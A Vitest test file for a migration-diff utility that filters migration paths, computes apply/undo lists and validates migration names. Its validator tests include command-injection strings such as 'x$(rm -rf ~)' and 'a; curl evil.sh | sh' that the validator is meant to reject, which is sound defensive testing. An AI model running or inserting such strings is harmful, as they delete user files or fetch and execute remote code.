import { describe, expect, it } from 'vitest';
import {
  computeDiff,
  filterMigrations,
  isSafeMigrationName,
  migrationName,
} from '../src/diff.js';

describe('filterMigrations', () => {
  const files = [
    'src/core/migrations/20240101-a.cjs',
    'src/core/migrations/20240102-b.cjs',
    'src/core/migrations/README.md',
    'src/core/models/user.js',
    'package.json',
  ];

  it('keeps only files under the migrations dir with a matching extension', () => {
    expect(filterMigrations(files, 'src/core/migrations', ['.cjs'])).toEqual([
      'src/core/migrations/20240101-a.cjs',
      'src/core/migrations/20240102-b.cjs',
    ]);
  });

  it('supports multiple extensions', () => {
    const mixed = ['m/1.cjs', 'm/2.js', 'm/3.ts', 'm/notes.txt'];
    expect(filterMigrations(mixed, 'm', ['.cjs', '.js'])).toEqual([
      'm/1.cjs',
      'm/2.js',
    ]);
  });

  it('normalises backslash paths to forward slashes', () => {
    expect(
      filterMigrations(['src\\m\\1.cjs'], 'src/m', ['.cjs']),
    ).toEqual(['src/m/1.cjs']);
  });

  it('tolerates a trailing slash on the migrations dir', () => {
    expect(filterMigrations(['m/1.cjs'], 'm/', ['.cjs'])).toEqual(['m/1.cjs']);
  });
});

describe('computeDiff', () => {
  it('detects added migrations to apply', () => {
    const diff = computeDiff(['m/1.cjs'], ['m/1.cjs', 'm/2.cjs']);
    expect(diff.toApply).toEqual(['m/2.cjs']);
    expect(diff.toUndo).toEqual([]);
  });

  it('detects removed migrations to undo', () => {
    const diff = computeDiff(['m/1.cjs', 'm/2.cjs'], ['m/1.cjs']);
    expect(diff.toApply).toEqual([]);
    expect(diff.toUndo).toEqual(['m/2.cjs']);
  });

  it('returns nothing when the lists match', () => {
    const diff = computeDiff(['m/1.cjs'], ['m/1.cjs']);
    expect(diff.toApply).toEqual([]);
    expect(diff.toUndo).toEqual([]);
  });

  it('orders undos newest-first (reverse lexicographic)', () => {
    const diff = computeDiff(
      ['m/20240101-a.cjs', 'm/20240102-b.cjs', 'm/20240103-c.cjs'],
      [],
    );
    expect(diff.toUndo).toEqual([
      'm/20240103-c.cjs',
      'm/20240102-b.cjs',
      'm/20240101-a.cjs',
    ]);
  });

  it('handles simultaneous adds and removes', () => {
    const diff = computeDiff(['m/1.cjs', 'm/2.cjs'], ['m/1.cjs', 'm/3.cjs']);
    expect(diff.toApply).toEqual(['m/3.cjs']);
    expect(diff.toUndo).toEqual(['m/2.cjs']);
  });
});

describe('migrationName', () => {
  it('strips path and extension', () => {
    expect(migrationName('src/core/migrations/20240101-add-users.cjs')).toBe(
      '20240101-add-users',
    );
  });
});

describe('isSafeMigrationName', () => {
  it('accepts normal sequelize migration names', () => {
    expect(isSafeMigrationName('20240101-add-users')).toBe(true);
    expect(isSafeMigrationName('20260614085039_add_offer_review_token_type')).toBe(true);
  });

  it('rejects shell metacharacters (command injection)', () => {
    expect(isSafeMigrationName('x$(rm -rf ~)')).toBe(false);
    expect(isSafeMigrationName('a; curl evil.sh | sh')).toBe(false);
    expect(isSafeMigrationName('a`whoami`')).toBe(false);
    expect(isSafeMigrationName('a && b')).toBe(false);
    expect(isSafeMigrationName('a|b')).toBe(false);
    expect(isSafeMigrationName('a b')).toBe(false);
  });

  it('rejects path traversal and empty names', () => {
    expect(isSafeMigrationName('..')).toBe(false);
    expect(isSafeMigrationName('.')).toBe(false);
    expect(isSafeMigrationName('a/b')).toBe(false);
    expect(isSafeMigrationName('')).toBe(false);
  });
});
